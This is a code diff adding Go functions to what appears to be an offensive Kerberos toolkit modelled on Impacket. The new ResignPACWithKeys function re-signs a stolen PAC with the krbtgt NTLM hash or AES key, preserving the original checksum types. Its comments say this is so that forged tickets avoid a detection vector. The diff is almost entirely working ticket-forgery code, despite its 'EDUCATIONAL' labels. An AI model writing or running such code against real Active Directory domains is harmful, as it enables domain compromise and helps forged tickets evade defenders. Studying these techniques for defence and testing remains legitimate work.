@@ -214,6 +214,133 @@ func ResignPAC(pacData []byte, key []byte, etype int32) ([]byte, error) {
 	return newPAC, nil
 }
 
+// ResignPACWithKeys re-signs a PAC preserving original checksum types.
+//
+// EDUCATIONAL: Impacket-Compatible PAC Re-signing
+//
+// Unlike ResignPAC which overwrites checksum types, this function:
+// - Preserves the ORIGINAL checksum types from the stolen PAC
+// - Uses the appropriate key for each checksum type:
+//   - RC4/HMAC-MD5 checksums → use NTLM hash
+//   - AES checksums → use AES key
+//
+// This avoids a potential detection vector where forged tickets have
+// different checksum types than legitimate tickets.
+//
+// Parameters:
+//   - pacData: Raw PAC bytes
+//   - ntHash: The krbtgt NTLM hash (for RC4 checksums)
+//   - aesKey: The krbtgt AES256 key (for AES checksums)
+//
+// Returns the re-signed PAC bytes.
+func ResignPACWithKeys(pacData []byte, ntHash []byte, aesKey []byte) ([]byte, error) {
+	pac, err := ParsePACForSigning(pacData)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse PAC: %w", err)
+	}
+
+	// Make a copy of the PAC data to modify
+	newPAC := make([]byte, len(pacData))
+	copy(newPAC, pacData)
+
+	// Find signature buffers
+	serverSigBuf := pac.GetBuffer(ServerChecksumType)
+	kdcSigBuf := pac.GetBuffer(KDCChecksumType)
+
+	if serverSigBuf == nil {
+		return nil, fmt.Errorf("PAC has no server signature buffer")
+	}
+	if kdcSigBuf == nil {
+		return nil, fmt.Errorf("PAC has no KDC signature buffer")
+	}
+
+	// Get offsets
+	serverSigOffset := int(serverSigBuf.Offset)
+	kdcSigOffset := int(kdcSigBuf.Offset)
+
+	// Read ORIGINAL checksum types from the PAC
+	serverChecksumType := int32(binary.LittleEndian.Uint32(serverSigBuf.Data[0:4]))
+	kdcChecksumType := int32(binary.LittleEndian.Uint32(kdcSigBuf.Data[0:4]))
+
+	fmt.Printf("[DEBUG] Original PAC checksum types: Server=%d (%s), KDC=%d (%s)\n",
+		serverChecksumType, getChecksumTypeName(serverChecksumType),
+		kdcChecksumType, getChecksumTypeName(kdcChecksumType))
+
+	// Determine key and sig size for each checksum
+	serverKey, serverEtype, serverSigSize, err := getKeyForChecksumType(serverChecksumType, ntHash, aesKey)
+	if err != nil {
+		return nil, fmt.Errorf("server checksum: %w", err)
+	}
+
+	kdcKey, kdcEtype, kdcSigSize, err := getKeyForChecksumType(kdcChecksumType, ntHash, aesKey)
+	if err != nil {
+		return nil, fmt.Errorf("KDC checksum: %w", err)
+	}
+
+	// Step 1: Zero out both signatures (keep the type fields)
+	// We need to use the larger of the two sig sizes for zeroing
+	maxSigSize := serverSigSize
+	if kdcSigSize > maxSigSize {
+		maxSigSize = kdcSigSize
+	}
+
+	for i := 0; i < maxSigSize; i++ {
+		if serverSigOffset+4+i < len(newPAC) {
+			newPAC[serverSigOffset+4+i] = 0
+		}
+		if kdcSigOffset+4+i < len(newPAC) {
+			newPAC[kdcSigOffset+4+i] = 0
+		}
+	}
+
+	// Step 2: Calculate Server Checksum over entire PAC (with zeroed signatures)
+	serverSig, err := calculatePACChecksum(newPAC, serverKey, serverEtype)
+	if err != nil {
+		return nil, fmt.Errorf("failed to calculate server signature: %w", err)
+	}
+
+	// Step 3: Insert Server signature
+	copy(newPAC[serverSigOffset+4:], serverSig[:serverSigSize])
+
+	// Step 4: Calculate KDC Checksum over the Server signature only
+	kdcSig, err := calculatePACChecksum(serverSig[:serverSigSize], kdcKey, kdcEtype)
+	if err != nil {
+		return nil, fmt.Errorf("failed to calculate KDC signature: %w", err)
+	}
+
+	// Step 5: Insert KDC signature
+	copy(newPAC[kdcSigOffset+4:], kdcSig[:kdcSigSize])
+
+	fmt.Printf("[DEBUG] Re-signed PAC with preserved checksum types\n")
+	return newPAC, nil
+}
+
+// getKeyForChecksumType returns the appropriate key and params for a checksum type.
+func getKeyForChecksumType(checksumType int32, ntHash, aesKey []byte) (key []byte, etype int32, sigSize int, err error) {
+	switch checksumType {
+	case HMAC_SHA1_96_AES256:
+		if len(aesKey) < 32 {
+			return nil, 0, 0, fmt.Errorf("AES256 checksum requires --aeskey (32 bytes)")
+		}
+		return aesKey, crypto.EtypeAES256, 12, nil
+
+	case HMAC_SHA1_96_AES128:
+		if len(aesKey) < 16 {
+			return nil, 0, 0, fmt.Errorf("AES128 checksum requires --aeskey (16 bytes)")
+		}
+		return aesKey[:16], crypto.EtypeAES128, 12, nil
+
+	case KERB_CHECKSUM_HMAC_MD5:
+		if len(ntHash) != 16 {
+			return nil, 0, 0, fmt.Errorf("HMAC-MD5 checksum requires --nthash (16 bytes)")
+		}
+		return ntHash, crypto.EtypeRC4, 16, nil
+
+	default:
+		return nil, 0, 0, fmt.Errorf("unsupported checksum type: %d", checksumType)
+	}
+}
+
 // calculatePACChecksum calculates a PAC checksum.
 //
 // EDUCATIONAL: PAC Checksum Algorithm
